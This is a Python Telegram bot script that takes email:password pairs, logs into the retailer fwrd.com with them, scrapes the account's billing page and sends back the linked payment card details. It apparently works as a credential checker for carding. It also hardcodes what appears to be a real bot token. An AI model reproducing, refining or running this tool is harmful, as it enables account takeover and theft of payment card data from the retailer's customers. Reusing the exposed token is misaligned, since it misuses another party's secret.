import requests
from bs4 import BeautifulSoup
from telegram import Update, Bot
from telegram.ext import CommandHandler, CallbackContext, Updater

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
TELEGRAM_BOT_TOKEN = '7297098002:AAGaCltHCKy-9PCZEiBDeyKW7nm4lw0oT6U'

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Welcome! Please provide your email and password in the format: /login email:password')

def login(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 1:
        update.message.reply_text('Please provide your email and password in the format: email:password')
        return

    email, password = context.args[0].split(':')
    session = requests.Session()

    # Login to fwrd.com
    login_url = 'https://www.fwrd.com/fw/mobile/Login.jsp'
    payload = {
        'email': email,
        'password': password
    }
    
    # Adding headers to the request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    
    session.post(login_url, data=payload, headers=headers)

    # Check linked cards
    billing_info_url = 'https://www.fwrd.com/fw/mobile/BillingInfo.jsp'
    response = session.get(billing_info_url, headers=headers)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract card information (this will depend on the actual HTML structure)
    cards = soup.find_all('div', class_='card-info')  # Adjust class name as necessary
    if cards:
        card_info = '\n'.join([card.get_text() for card in cards])
        update.message.reply_text(f'Linked Cards:\n{card_info}')
    else:
        update.message.reply_text('No linked cards found or login failed.')

def main() -> None:
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('login', login))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
